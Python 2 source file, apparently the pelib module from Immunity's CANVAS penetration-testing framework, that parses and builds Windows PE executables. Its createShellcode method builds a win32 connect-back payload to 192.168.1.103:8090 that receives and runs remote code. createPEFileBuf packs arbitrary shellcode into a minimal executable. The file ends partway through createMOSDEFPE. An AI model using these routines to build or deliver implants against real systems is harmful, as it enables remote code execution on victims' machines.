#! /usr/bin/env python
"""
(c) Immunity, Inc. 2004-2007


U{Immunity Inc.<http://www.immunityinc.com>} pelib

Proprietary CANVAS source code - use only under the license agreement
specified in LICENSE.txt in your CANVAS distribution
Copyright Immunity, Inc, 2002-2007
http://www.immunityinc.com/CANVAS/ for more information

"""

__VERSION__ = '1.0'

import struct, sys
sys.path.append(".")
sys.path.append("../")
#try:
#        import mosdefutils
#except ImportError:
#        # Is this IMdbug
#        import immutils
        
try:
        import mosdef
except ImportError:
        pass
try:
        from shellcode import shellcodeGenerator
except ImportError:
        pass

IMAGE_SIZEOF_FILE_HEADER=20
MZ_MAGIC = 0x5A4D
PE_MAGIC = 0x4550
IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
IMAGE_ORDINAL_FLAG = 0x80000000L

# PE documentation:
# http://win32assembly.online.fr/files/pe1.zip

def hexdump(buf):
        tbl=[]
        tmp=""
        hex=""
        i=0
        for a in buf:
                hex+="%02X "% ord(a)
                i+=1
                if ord(a) >=0x20 and ord(a) <0x7f:
                        tmp+=a
                else:
                        tmp+="."
                if i%16 == 0:
                        tbl.append((hex, tmp))
                        hex=""
                        tmp=""
        tbl.append((hex, tmp))
        return tbl

def readStringFromFile(fd, offset):
    idx= fd.tell()
    fd.seek(offset)
    b=f.read(4096*4)
    zero=b.find("\0")
    fd.seek(idx)
    if zero > -1:
        return b[:zero]
    return ""
    
#typedef struct _IMAGE_DOS_HEADER {  // DOS .EXE header
    #USHORT e_magic;         // Magic number
    #USHORT e_cblp;          // Bytes on last page of file
    #USHORT e_cp;            // Pages in file
    #USHORT e_crlc;          // Relocations
    #USHORT e_cparhdr;       // Size of header in paragraphs
    #USHORT e_minalloc;      // Minimum extra paragraphs needed
    #USHORT e_maxalloc;      // Maximum extra paragraphs needed
    #USHORT e_ss;            // Initial (relative) SS value
    #USHORT e_sp;            // Initial SP value
    #USHORT e_csum;          // Checksum
    #USHORT e_ip;            // Initial IP value
    #USHORT e_cs;            // Initial (relative) CS value
    #USHORT e_lfarlc;        // File address of relocation table
    #USHORT e_ovno;          // Overlay number
    #USHORT e_res[4];        // Reserved words
    #USHORT e_oemid;         // OEM identifier (for e_oeminfo)
    #USHORT e_oeminfo;       // OEM information; e_oemid specific
    #USHORT e_res2[10];      // Reserved words
    #LONG   e_lfanew;        // File address of new exe header
  #} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;


class PEError(Exception): pass

class MZ:
    
    def __init__(self):
        self.fmt="<30HL"
        self.e_magic=0x5A4D
        self.e_cblp=self.e_cp=self.e_crlc=self.e_cparhdr=self.e_minalloc=self.e_maxalloc = self.e_ss = self.e_sp =\
            self.e_csum = self.e_ip= self.e_cs = self.e_lfarlc = self.e_ovno = self.e_oemid =\
            self.e_oeminfo = self.e_res2 =self.e_lfanew = 0

        self.e_res = [0,0,0,0]
        self.e_res2 = [0,0,0,0,0,0,0,0,0,0]
        
    def getSize(self):
            return struct.calcsize(self.fmt)

    def get(self, data):
        try:
            buf=struct.unpack(self.fmt, data[:struct.calcsize(self.fmt)])
        except struct.error:
            raise PEError, "The header doesn't correspond to a MZ header"
            
        self.e_magic    = buf[0]
        self.e_cblp     = buf[1]
        self.e_cp       = buf[2]
        self.e_crlc     = buf[3]
        self.e_cparhdr  = buf[4]
        self.e_minalloc = buf[5]
        self.e_maxalloc = buf[6]
        self.e_ss       = buf[7]
        self.e_sp       = buf[8]
        self.e_csum     = buf[9]
        self.e_ip       = buf[10]
        self.e_cs       = buf[11]
        self.e_lfarlc   = buf[12]
        self.e_ovno     = buf[13]
        self.e_res      = buf[14:18]
        self.e_oemid    = buf[18]
        self.e_oeminfo  = buf[19]
        self.e_res2     = buf[20:30]
        self.e_lfanew   = buf[30]

        if self.e_magic != MZ_MAGIC:
            raise PEError, "The header doesn't correspond to a MZ header"

    def raw(self):
            return struct.pack(self.fmt, self.e_magic, self.e_cblp, self.e_cp,\
                            self.e_crlc, self.e_cparhdr, self.e_minalloc,\
                            self.e_maxalloc, self.e_ss, self.e_sp, self.e_csum,\
                            self.e_ip, self.e_cs, self.e_lfarlc, self.e_ovno, \
                            self.e_res[0],self.e_res[1],self.e_res[2],self.e_res[3],\
                            self.e_oemid, self.e_oeminfo,\
                            self.e_res2[0], self.e_res2[1], self.e_res2[2], self.e_res2[3],\
                            self.e_res2[4], self.e_res2[5], self.e_res2[6], self.e_res2[7],
                            self.e_res2[8], self.e_res2[9], self.e_lfanew)

    # returns the e_lfanew offset
    def getPEOffset(self):
         return self.e_lfanew

class ImageImportByName:
        def __init__(self):
                self.fmt = "<H"
                self.Hint=0
                self.Name=""

        def get(self, data):
                self.Hint = struct.unpack(self.fmt, data[:2])[0]
                ndx = data[2:].find("\0")
                if ndx == -1:
                        raise PEError, "No string found on ImageImportByName"
                self.Name = data[2:2+ndx]

        def getSize(self):
                return len(self.Name) +3 # 1 for \0 + 2 for Hint

        def raw(self):
                return struct.pack(self.fmt, self.Hint) + self.Name + "\0"
                
class ImportDescriptor:
    def __init__(self):
        self.fmt= "<LLLLL"
        self.OriginalFirstThunk= self.TimeDateStamp= self.ForwarderChain= self.Name=\
            self.FirstThunk=0
        self.sName =""
        self.Imports={}
        
    def get(self, data):
        (self.OriginalFirstThunk, self.TimeDateStamp, self.ForwarderChain, self.Name,\
         self.FirstThunk) = struct.unpack(self.fmt, data)

    def setSname(self, name):
            self.sName= name

    def setImport(self, name, obj):
            self.Imports[name] = obj
            
    def raw(self):
        return struct.pack(self.fmt, self.OriginalFirstThunk, self.TimeDateStamp, self.ForwarderChain, self.Name,\
         self.FirstThunk)

    def getSize(self):
            return struct.calcsize(self.fmt)
                           
#typedef struct _IMAGE_DATA_DIRECTORY {
#    ULONG   VirtualAddress;
#    ULONG   Size;
#} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

     
class Directory:

    def __init__(self):
        self.VirtualAddress = self.Size = 0

    def get(self, data):
        (self.VirtualAddress, self.Size) = struct.unpack("2L", data)

    def raw(self):
        return struct.pack("2L", self.VirtualAddress, self.Size)

    def getSize(self):
            return 0x8
    
#typedef struct _IMAGE_EXPORT_DIRECTORY {
#    DWORD   Characteristics;
#    DWORD   TimeDateStamp;
#    WORD    MajorVersion;
#    WORD    MinorVersion;
#    DWORD   Name;
#    DWORD   Base;
#    DWORD   NumberOfFunctions;
#    DWORD   NumberOfNames;
#    DWORD   AddressOfFunctions;     // RVA from base of image
#    DWORD   AddressOfNames;         // RVA from base of image
#    DWORD   AddressOfNameOrdinals;  // RVA from base of image
#} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY
class ImageExportDirectory:
        def __init__(self):
                self.fmt = "<2L2H7L"
                self.Characteristics = self.TimeDateStamp = self.MajorVersion = self.MinorVersion = self.Name = self.Base=\
                    self.NumberOfFunctions = self.NumberOfNames = self.AddressOfFunctions = self.AddressOfNames = \
                    self.AddressOfNameOrdinals = 0
                self.sName=""
                
        def setName(self, name):
                self.sName = name                
                
        def getSize(self):
                return struct.calcsize(self.fmt)
                
        def get(self, data):
                (self.Characteristics, self.TimeDateStamp, self.MajorVersion, self.MinorVersion, self.Name, self.Base,\
                    self.NumberOfFunctions, self.NumberOfNames, self.AddressOfFunctions, self.AddressOfNames, \
                    self.AddressOfNameOrdinals) = struct.unpack(self.fmt, data)

        def raw(self):
                return struct.pack(self.fmt, self.Characteristics, self.TimeDateStamp, self.MajorVersion, self.MinorVersion, self.Name, self.Base,\
                    self.NumberOfFunctions, self.NumberOfNames, self.AddressOfFunctions, self.AddressOfNames, \
                    self.AddressOfNameOrdinals)
                


#define IMAGE_SIZEOF_SHORT_NAME              8
#
#typedef struct _IMAGE_SECTION_HEADER {
#    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];
#    union {
#            DWORD   PhysicalAddress;
#            DWORD   VirtualSize;
#    } Misc;umber
#    DWORD   VirtualAddress;
#    DWORD   SizeOfRawData;
#    DWORD   PointerToRawData;
#    DWORD   PointerToRelocations;
#    DWORD   PointerToLinenumbers;
#    WORD    NumberOfRelocations;
#    WORD    NumberOfLinenumbers;
#    DWORD   Characteristics;
#} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

class Section:
        def __init__(self):
                self.fmt="<LLLLLLHHL"
                self.Name=""
                self.VirtualSize = self.VirtualAddress = self.SizeOfRawData = self.PointerToRawData =\
                                self.PointerToRelocations = self.PointerToLinenumbers=\
                                self.NumberOfRelocations = self.NumberOfLinenumbers =\
                                self.Characteristics = 0
                
        def getSize(self):
                return struct.calcsize(self.fmt) + 8

        def has(self, rva, imagebase=0):
            return rva >= (self.VirtualAddress+imagebase) and rva < (self.VirtualAddress+self.VirtualSize+imagebase)

        def hasOffset(self, offset):
            return offset >= self.PointerToRawData and offset < (self.PointerToRawData + self.VirtualSize)

    
        def get(self, data):
                idx=0
                
                self.Name=data[idx:idx+8]
                idx+=8

                (self.VirtualSize, self.VirtualAddress, self.SizeOfRawData, self.PointerToRawData ,\
                                self.PointerToRelocations, self.PointerToLinenumbers,\
                                self.NumberOfRelocations, self.NumberOfLinenumbers,\
                                self.Characteristics)= \
                                struct.unpack(self.fmt, data[idx:])
                
        def raw(self):
                self.Name = (self.Name + "\x00" * (8-len(self.Name)))[:8]
                return self.Name + struct.pack(self.fmt, self.VirtualSize, \
                                self.VirtualAddress, self.SizeOfRawData, self.PointerToRawData,\
                                self.PointerToRelocations, self.PointerToLinenumbers,\
                                self.NumberOfRelocations, self.NumberOfLinenumbers,\
                                self.Characteristics)                   
                
                

#typedef struct _IMAGE_FILE_HEADER {
#        USHORT  Machine;
#        USHORT  NumberOfSections;
#        ULONG   TimeDateStamp;
#        ULONG   PointerToSymbolTable;
#        ULONG   NumberOfSymbols;
#        USHORT  SizeOfOptionalHeader;
#        USHORT  Characteristics;
#} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

##define IMAGE_SIZEOF_FILE_HEADER             20
class IMGhdr:
        def __init__(self):
             self.imagefmt= "<2H3L2H"
             (self.Machine,\
             self.NumberOfSections,\
             self.TimeDateStamp,\
             self.PointerToSymbolTable,\
             self.NumberOfSymbols,\
             self.SizeOfOptionalHeader,\
             self.Characteristics)= (0,0,0,0,0,0xe0,0)

        def get(self, data):
             try:
                     (self.Machine,\
                self.NumberOfSections,\
                self.TimeDateStamp,\
                self.PointerToSymbolTable,\
                self.NumberOfSymbols,\
                self.SizeOfOptionalHeader,\
                self.Characteristics)=struct.unpack(self.imagefmt, data)
             except struct.error:
                raise PEError, "Invalid IMAGE header" % self.signature

        def getSize(self):
             return struct.calcsize(self.imagefmt)
     
        def raw(self):
             try:
                return struct.pack(self.imagefmt,self.Machine,\
                        self.NumberOfSections,\
                        self.TimeDateStamp,\
                        self.PointerToSymbolTable,\
                        self.NumberOfSymbols,\
                        self.SizeOfOptionalHeader,\
                        self.Characteristics)
             except struct.error:
                raise PEError, "Image not initialized" % self.signature
                
                                                    
#typedef struct _IMAGE_OPTIONAL_HEADER {
#    //
#    // Standard fields.
#    //
#    USHORT  Magic;
#    UCHAR   MajorLinkerVersion;
#    UCHAR   MinorLinkerVersion;
#    ULONG   SizeOfCode;
#    ULONG   SizeOfInitializedData;
#    ULONG   SizeOfUninitializedData;
#    ULONG   AddressOfEntryPoint;
#    ULONG   BaseOfCode;
#    ULONG   BaseOfData;
#    //
#    // NT additional fields.
#    //
#    ULONG   ImageBase;
#    ULONG   SectionAlignment;
#    ULONG   FileAlignment;
#    USHORT  MajorOperatingSystemVersion;
#    USHORT  MinorOperatingSystemVersion;
#    USHORT  MajorImageVersion;
#    USHORT  MinorImageVersion;
#    USHORT  MajorSubsystemVersion;
#    USHORT  MinorSubsystemVersion;
#    ULONG   Reserved1;
#    ULONG   SizeOfImage;
#    ULONG   SizeOfHeaders;
#    ULONG   CheckSum;
#    USHORT  Subsystem;
#    USHORT  DllCharacteristics;
#    ULONG   SizeOfStackReserve;
#    ULONG   SizeOfStackCommit;
#    ULONG   SizeOfHeapReserve;
#    ULONG   SizeOfHeapCommit;
#    ULONG   LoaderFlags;
#    ULONG   NumberOfRvaAndSizes;
#    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
#} IMAGE_OPTIONAL_HEADER, *PIMAGE_OPTIONAL_HEADER;

class IMGOPThdr:
        def __init__(self):
                self.optionalfmt="<HBB9L6H4L2H6L"
                self.Magic=0x010b
                self.MajorLinkerVersion = self.MinorLinkerVersion = self.SizeOfCode =\
                    self.SizeOfInitializedData = self.SizeOfUninitializedData = self.AddressOfEntryPoint =\
                    self.BaseOfCode = self.BaseOfData = self.ImageBase = self.SectionAlignment = self.FileAlignment =\
                    self.MajorOperatingSystemVersion = self.MinorOperatingSystemVersion = self.MajorImageVersion =\
                    self.MinorImageVersion = self.MajorSubsystemVersion = self.MinorSubsystemVersion =\
                    self.Reserved1 = self.SizeOfImage = self.SizeOfHeaders = self.CheckSum = self.Subsystem =\
                    self.DllCharacteristics = self.SizeOfStackReserve = self.SizeOfStackCommit = self.SizeOfHeapReserve=\
                    self.SizeOfHeapCommit = self.LoaderFlags = self.NumberOfRvaAndSizes  =0 

        def getSize(self):
                return struct.calcsize(self.optionalfmt)

        def Print(self):
                return "self.Magic %08x,\
                self.MajorLinkerVersion %08x,\
                    self.MinorLinkerVersion %08x,\
                    self.SizeOfCode %08x,\
                    self.SizeOfInitializedData %08x,\
                    self.SizeOfUninitializedData %08x,\
                    self.AddressOfEntryPoint %08x,\
                    self.BaseOfCode %08x,\
                    self.BaseOfData %08x,\
                    self.ImageBase %08x,\
                    self.SectionAlignment %08x,\
                    self.FileAlignment %08x,\
                    self.MajorOperatingSystemVersion %08x,\
                    self.MinorOperatingSystemVersion %08x,\
                    self.MajorImageVersion %08x,\
                    self.MinorImageVersion %08x,\
                    self.MajorSubsystemVersion %08x,\
                    self.MinorSubsystemVersion %08x,\
                    self.Reserved1 %08x,\
                    self.SizeOfImage %08x,\
                    self.SizeOfHeaders %08x,\
                    self.CheckSum %08x,\
                    self.Subsystem %08x,\
                    self.DllCharacteristics %08x,\
                    self.SizeOfStackReserve %08x,\
                    self.SizeOfStackCommit %08x,\
                    self.SizeOfHeapReserve %08x,\
                    self.SizeOfHeapCommit %08x,\
                    self.LoaderFlags %08x,\
                    self.NumberOfRvaAndSizes %08x" % \
                (self.Magic,\
                self.MajorLinkerVersion,\
                    self.MinorLinkerVersion,\
                    self.SizeOfCode,\
                    self.SizeOfInitializedData,\
                    self.SizeOfUninitializedData,\
                    self.AddressOfEntryPoint,\
                    self.BaseOfCode,\
                    self.BaseOfData,\
                    self.ImageBase,\
                    self.SectionAlignment,\
                    self.FileAlignment,\
                    self.MajorOperatingSystemVersion,\
                    self.MinorOperatingSystemVersion,\
                    self.MajorImageVersion,\
                    self.MinorImageVersion,\
                    self.MajorSubsystemVersion,\
                    self.MinorSubsystemVersion,\
                    self.Reserved1,\
                    self.SizeOfImage,\
                    self.SizeOfHeaders,\
                    self.CheckSum,\
                    self.Subsystem,\
                    self.DllCharacteristics,\
                    self.SizeOfStackReserve,\
                    self.SizeOfStackCommit,\
                    self.SizeOfHeapReserve,\
                    self.SizeOfHeapCommit,\
                    self.LoaderFlags,\
                    self.NumberOfRvaAndSizes )
                
        def get(self, data):    
            try:
                (self.Magic,\
                self.MajorLinkerVersion,\
                    self.MinorLinkerVersion,\
                    self.SizeOfCode,\
                    self.SizeOfInitializedData,\
                    self.SizeOfUninitializedData,\
                    self.AddressOfEntryPoint,\
                    self.BaseOfCode,\
                    self.BaseOfData,\
                    self.ImageBase,\
                    self.SectionAlignment,\
                    self.FileAlignment,\
                    self.MajorOperatingSystemVersion,\
                    self.MinorOperatingSystemVersion,\
                    self.MajorImageVersion,\
                    self.MinorImageVersion,\
                    self.MajorSubsystemVersion,\
                    self.MinorSubsystemVersion,\
                    self.Reserved1,\
                    self.SizeOfImage,\
                    self.SizeOfHeaders,\
                    self.CheckSum,\
                    self.Subsystem,\
                    self.DllCharacteristics,\
                    self.SizeOfStackReserve,\
                    self.SizeOfStackCommit,\
                    self.SizeOfHeapReserve,\
                    self.SizeOfHeapCommit,\
                    self.LoaderFlags,\
                    self.NumberOfRvaAndSizes )= struct.unpack(self.optionalfmt, data)
            except struct.error:
                raise PEError, "Invalid Optional Header" % self.signature

        def raw(self):
            try:
                return struct.pack(self.optionalfmt, self.Magic,\
                self.MajorLinkerVersion,\
                    self.MinorLinkerVersion,\
                    self.SizeOfCode,\
                    self.SizeOfInitializedData,\
                    self.SizeOfUninitializedData,\
                    self.AddressOfEntryPoint,\
                    self.BaseOfCode,\
                    self.BaseOfData,\
                    self.ImageBase,\
                    self.SectionAlignment,\
                    self.FileAlignment,\
                    self.MajorOperatingSystemVersion,\
                    self.MinorOperatingSystemVersion,\
                    self.MajorImageVersion,\
                    self.MinorImageVersion,\
                    self.MajorSubsystemVersion,\
                    self.MinorSubsystemVersion,\
                    self.Reserved1,\
                    self.SizeOfImage,\
                    self.SizeOfHeaders,\
                    self.CheckSum,\
                    self.Subsystem,\
                    self.DllCharacteristics,\
                    self.SizeOfStackReserve,\
                    self.SizeOfStackCommit,\
                    self.SizeOfHeapReserve,\
                    self.SizeOfHeapCommit,\
                    self.LoaderFlags,\
                    self.NumberOfRvaAndSizes )
                
            except struct.error:
                raise PEError, "Invalid Optional Header" % self.signature
        
class PE:
    def __init__(self):
        #IMAGE HEADER
        self.Directories=[]
        self.Sections={}
        self.Imports={}
        
    def get(self, data, offset2PE):
        self.offset2PE=offset2PE
        idx=self.offset2PE
        
        self.signature,=struct.unpack("L", data[idx:idx+4])
        idx+=4

        if self.signature != PE_MAGIC:            
            raise PEError, "Invalid PE Signature: %08x" % self.signature

        self.IMGhdr = IMGhdr()
        self.IMGhdr.get(data[idx: idx+self.IMGhdr.getSize()])

        idx += self.IMGhdr.getSize()
        
        self.IMGOPThdr = IMGOPThdr()
        self.IMGOPThdr.get(data[idx:idx+self.IMGOPThdr.getSize()])
        idx += self.IMGOPThdr.getSize()
        

        self.getDirectories(data[idx: idx+IMAGE_NUMBEROF_DIRECTORY_ENTRIES*8])
        idx += IMAGE_NUMBEROF_DIRECTORY_ENTRIES*8

        #print "-" * 4 + " Directories "+ "-" * 4
        #self.printDirectories()

        idx += self.getSections(data[idx:])

        #print "-" * 4 + " Sections "+ "-" * 4
        #self.printSections()
        
        # Getting Imports
        #print "-" * 4 + " Imports "+ "-" * 4
        self.getImportDescriptor(data, self.Directories[1].VirtualAddress)
        self.printImportDescriptor()

        #print "-" * 4 + " Exports "+ "-" * 4
        #self.getExportDescriptor(data, self.Directories[0].VirtualAddress)

        #offset=self.getOffsetFromRVA(0x7aac)
        #print hexdump(data[offset:offset+0x10])
        #print self.IMGOPThdr.Print()
        
    def getSections(self, data):
        idx = 0
        for a in range(0, self.IMGhdr.NumberOfSections):
            sec= Section()
            sec.get(data[idx:idx+sec.getSize()])
            idx+=sec.getSize()
            self.Sections[sec.Name] = sec
                        
        return idx+ sec.getSize()

    def getImportDescriptor(self, data, rva):
            offset=self.getOffsetFromRVA(rva)
            if not offset: 
                    print "No Import Table Found"
                    return ""
            while 1:
                    im = ImportDescriptor()

                    im.get(data[offset:offset + im.getSize()])
                    if im.OriginalFirstThunk == 0:
                            break
                    im.setSname(self.getString(data, im.Name))
                    if not im.sName:
                            raise PEError, "No String found on Import at offset: 0x%08x" % offset
                    self.Imports[im.sName] = im
                    
                    funcNdx= self.getOffsetFromRVA(im.OriginalFirstThunk)
                    while 1:
                            rva2IIBN= struct.unpack("L", data[funcNdx:funcNdx+4])[0]
                            funcNdx+=4
                            if rva2IIBN == 0:
                                    break
                            iibn=ImageImportByName()
                            if rva2IIBN & IMAGE_ORDINAL_FLAG:
                                    im.setImport("#"+str(rva2IIBN & ~(IMAGE_ORDINAL_FLAG))\
                                                 , iibn)
                            else:
                                    off2IIBN=self.getOffsetFromRVA(rva2IIBN)

                                    iibn=ImageImportByName()
                                    iibn.get(data[off2IIBN:])
                                    im.setImport(iibn.Name, iibn)                                                        
                    
                    offset+=im.getSize()
                    
    def printImportDescriptor(self):
            for a in self.Imports.keys():
                    im = self.Imports[a] # to clarify a bit
                    
                    for b in im.Imports.keys():
                            print a, ":",b
                            
    def printSections(self):
        print "Name   VirtulAddress  PointerToRawData"
        for a in self.Sections.keys():
                print a, hex(self.Sections[a].VirtualAddress), hex(self.Sections[a].PointerToRawData), hex(self.Sections[a].SizeOfRawData )
        

    def getString(self, data, rva):
            offset=self.getOffsetFromRVA(rva)
            end= data[offset:].find("\0")
            if end ==-1:
                    return ""
            return data[offset:offset+end]
    
    def getOffsetFromRVA(self, rva, imagebase=0):
        sec=None
        for a in self.Sections.keys():
            if self.Sections[a].has(rva, imagebase):
                sec=self.Sections[a]
        if sec:
            return  (rva -sec.VirtualAddress -imagebase )+ sec.PointerToRawData
        return ""

    def getRVAfromoffset(self, offset, imagebase=0):
            sec = None
            for a in self.Sections.keys():
                    if self.Sections[a].hasOffset(offset):
                            sec=self.Sections[a]
            if sec:
                    return  (offset -sec.PointerToRawData)+ sec.VirtualAddress+imagebase
            return ""            

    def getDirectories(self, data):
        self.Directories=[]
        for a in range(0, IMAGE_NUMBEROF_DIRECTORY_ENTRIES):
            directory= Directory()
            directory.get(data[a*8 : a*8+8])
            self.Directories.append(directory)

    def printDirectories(self):
        for a in self.Directories:
            print "%08x %08x " % (a.VirtualAddress, a.Size)

    def getExportDescriptor(self,data,  rva):
            offset=self.getOffsetFromRVA(rva)
            if not offset: 
                    #print "No Export Table Found"
                    return ""            
            em = ImageExportDirectory()
            em.get(data[offset:offset+ em.getSize()])
            em.setName( self.getString(data, em.Name)) # We use the address at is it (No offset from rva)
            addrofnames   = self.getOffsetFromRVA(em.AddressOfNames)
            addroforidnal = self.getOffsetFromRVA(em.AddressOfNameOrdinals)
            eat = self.getOffsetFromRVA(em.AddressOfFunctions)
            
            for a in range(0, em.NumberOfNames):
                    nameaddr = struct.unpack("L", data[ addrofnames   : addrofnames+4 ])[0]
                    ordinal  = struct.unpack("H", data[ addroforidnal : addroforidnal+2 ])[0]
                    address  = struct.unpack("L", data[ eat +ordinal*4 : eat +ordinal*4+4 ])[0]
                    
                    try:
                            name = self.getString(data, nameaddr)
                    except TypeError, msg:
                            print "Error on Export Table %s" % str(msg)
                            break
                    print "0x%08x (0x%08x):  %s" % (self.IMGOPThdr.ImageBase + address, address, name) 
                    addrofnames +=4
                    addroforidnal+=2
                    
            #arrayname=struct.unpack("L", data[em.AddressOfNames:em.AddressOfNames+4])[0]
            #print hex(arrayname)
            #print self.getString(data, arrayname)
            #for a in range(0, em.NumberOfNames):
            #        name_off= struct.unpack("L", data[arrayname+a*4:arrayname+a*4+4])[0]
            #        print hex(name_off)
            #        print self.getString(data, name_off)
            #print em.NumberOfNames
            
                    
class PElib:
        def __init__(self):
                pass
                
        def openrawdata(self, data):
                self.rawdata = data
                self._openPE()

        def openfile(self, filename):
                self.fd = open(filename, "rb")                
                self.filename = filename
                self.rawdata = self.fd.read()
                #shellcode=self.createShellcode()

                self._openPE()
                #self.createPE(shellcode)

        def createShellcode(self):
                # for test only
                localhost = "192.168.1.103"
                localport = 8090
                
                sc = shellcodeGenerator.win32()
                sc.addAttr("findeipnoesp",{"subespval": 0x1000 })
                sc.addAttr("revert_to_self_before_importing_ws2_32", None)
                sc.addAttr("tcpconnect", {"port" : localport, "ipaddress" : localhost})
                sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
                sc.addAttr("ExitThread", None)
                injectme = sc.get()

                sc = shellcodeGenerator.win32()
                sc.addAttr("findeipnoesp", {"subespval": 0})
                sc.addAttr("InjectToSelf", { "injectme" : injectme })
                sc.addAttr("ExitThread", None)
                return sc.get()
        
        def align(self, idx, aligment):
                return (idx +aligment) & ~(aligment-1)

        def _openPE(self):
                self.MZ = MZ()
                idx=0
                self.MZ.get(self.rawdata[idx:idx+self.MZ.getSize()])
                self.PE = PE()
                self.PE.get(self.rawdata, self.MZ.getPEOffset())        
        
        def createPE(self, filename, shellcode, importante = [ ("advapi32.dll", ["RevertToSelf"])] ):

                buf = self.createPEFileBuf(shellcode, importante) 

                f=open(filename, "wb")                                
                f.write(buf)
                f.close()
        
        
        def createPEFileBuf(self, shellcode, importante = [ ("advapi32.dll", ["RevertToSelf"])] ):
                
                idx= 0
                # MZ
                mz = MZ()
                mz.e_lfanew = mz.getSize()
                
                idx+= mz.getSize()

                # PE Image Header
                imgHdr = IMGhdr()
                imgHdr.Machine = 0x014c         # i386
                imgHdr.NumberOfSections = 0x2   # Code and data for now (Maybe we can do it only one)
                imgHdr.Characteristics = 0x0102 # Executable on 32-bit machine
                
                idx += imgHdr.getSize() + 4 # for PE_MAGIC
                
                # Optional Header 
                imgOpt = IMGOPThdr()
                imgOpt.SectionAlignment = 0x20 # Thats our aligment
                imgOpt.FileAlignment    = 0x20
                imgOpt.MajorOperatingSystemVersion = 0x4 # NT4.0
                imgOpt.MajorSubsystemVersion = 0x4 # Win32 4.0
                imgOpt.Subsystem = 0x3
                imgOpt.SizeOfStackReserve = 0x100000
                imgOpt.SizeOfStackCommit  = 0x1000
                imgOpt.SizeOfHeapReserve  = 0x100000
                imgOpt.SizeOfHeapCommit   = 0x1000
                imgOpt.NumberOfRvaAndSizes= 0x10

                idx += imgOpt.getSize()
                
                # Directories
                directories=[]
                for a in range(0, imgOpt.NumberOfRvaAndSizes):
                        directories.append(Directory())

                idx+= directories[0].getSize() * 16

                # .code section
                code = Section()
                code.Name = ".text"
                code.Characteristics = 0x60000020L  # Code | Executable | Readable
                idx+= code.getSize()
                
                # .data section
                data = Section()
                data.Name = ".data"
                data.Characteristics = 0xc0000040L # Initialized | Readable | Writeable
                
                idx += data.getSize()
                
                code_offset = self.align(idx, imgOpt.FileAlignment)
                firstpad= "\0" * (code_offset - idx)
                idx=code_offset
                
                # we can fill data_buf with our data and that will be loaded into mem :>
                idx+= len(shellcode)
                data_offset = self.align(idx, imgOpt.FileAlignment)
                secondpad= "\0" * (data_offset - idx)
                idx = data_offset
                data_buf =""  
                idx+= len(data_buf)
                
                # Creating the list of ImportDescriptors
                import_offset =idx
                imports=[]
                ndx= 0
                import_str=""
                
                for a in importante:
                        i= ImportDescriptor()
                        i.ForwarderChain= 0xFFFFFFFFL
                        imports.append( (i,  ndx))

                        ndx+=len(a[0]+"\0") # We put on NDX, an index of the name string, so at the end
                                          #  to find a string, we will do import_str_offset + this_index

                        import_str += a[0] + "\0" # Collecting dll names

                # The final importdescriptor
                imports.append((ImportDescriptor(), 0))
                idx+= i.getSize() * len(imports)
                
                import_str_offset = idx
                idx+= len(import_str)
                                         
                off = self.align(idx, imgOpt.FileAlignment)
                import_str+="\0" * (off-idx)
                idx = off
                
                # Original Thunks
                original_thunks_offset = idx
                original_thunk=[]
                for a in importante:
                        original_thunk.append(idx)
                        idx+= len(a[1]) * 4 + 4

                # First thunk offset
                first_thunks_offset = idx
                first_thunk=[]
                for a in importante:
                        first_thunk.append(idx)
                        idx+= len(a[1]) * 4 + 4
                                                                        
                # Creating IIBN 
                IIBN=[]
                for a in importante: 
                        tbl=[]
                        IIBN.append(tbl)
                        for b in a[1]:
                                iibn = ImageImportByName()
                                iibn.Name = b #"RevertToSelf"
                                iibn.Hint = 1
                                tbl.append((iibn, idx)) 
                                idx+=iibn.getSize()                
                                
                endpad= "\0" * (self.align(idx, imgOpt.FileAlignment) - idx)   
                
                # Filling the gaps
                imgOpt.SizeOfCode = len(shellcode) + len(secondpad)
                imgOpt.BaseOfCode = imgOpt.AddressOfEntryPoint = code_offset
                imgOpt.BaseOfData = data_offset
                imgOpt.ImageBase = 0x40000
                imgOpt.SizeOfInitializedData = 0x20
                imgOpt.SizeOfImage = 0xc # ?
                
                imgOpt.SizeOfHeaders = code_offset
                imgOpt.NumberOfRvaAndSizes = 0x10
                
                # Import Directory

                directories[1].VirtualSize=directories[1].Size = idx - import_offset 
                directories[1].VirtualAddress= import_offset 
                
                # code and data
                code.VirtualAddress = code_offset
                code.VirtualSize= code.SizeOfRawData  = imgOpt.SizeOfCode 
                code.PointerToRawData = code_offset
                
                data.VirtualAddress = data_offset
                data.VirtualSize = data.SizeOfRawData = idx - data_offset #len(data_buf)
                data.PointerToRawData  = data_offset

                imgOpt.SizeOfImage = idx # code.SizeOfRawData + data.SizeOfRawData
                
                # Fixing imports with thunk info
                for a in range(0, len(imports)-1):
                        imports[a][0].OriginalFirstThunk= original_thunk[a]
                        imports[a][0].FirstThunk= first_thunk[a] 
                        imports[a][0].Name = import_str_offset + imports[a][1]                        
                        
                
                # RAWing...
                buf = mz.raw() + struct.pack("L", PE_MAGIC) +imgHdr.raw() + imgOpt.raw()
                for a in directories:
                        buf+= a.raw()
                buf+= code.raw()
                buf+= data.raw()
                buf+= firstpad
                buf+= shellcode
                buf+= secondpad
                buf+= data_buf   
                
                for a in imports:
                        buf+= a[0].raw()
                buf+= import_str

                # ORIGINAL THUNK
                for a in IIBN:
                        for b in a: # Listing function
                                buf+=struct.pack("L",b[1]) 
                        buf+=struct.pack("L",0x0)

                # FIRST THUNK
                for a in IIBN:
                        for b in a: # Listing function
                                buf+=struct.pack("L",b[1]) 
                        buf+=struct.pack("L",0x0)
                        
                # IIBN
                for a in IIBN:
                        for b in a:
                                buf+= b[0].raw()
                buf+= endpad
                
                return buf
        
        
        # For MOSDEF 
        def createMOSDEFPE(self, filename, code, vars={}): 
                from win32peresolver import win32peresolver
                # shellcode, importante=[ ("advapi32.dll", ["RevertToSelf"])] ):
                
                # Mixing MOSDEF with PElib.
                # Concerning Mosdef:
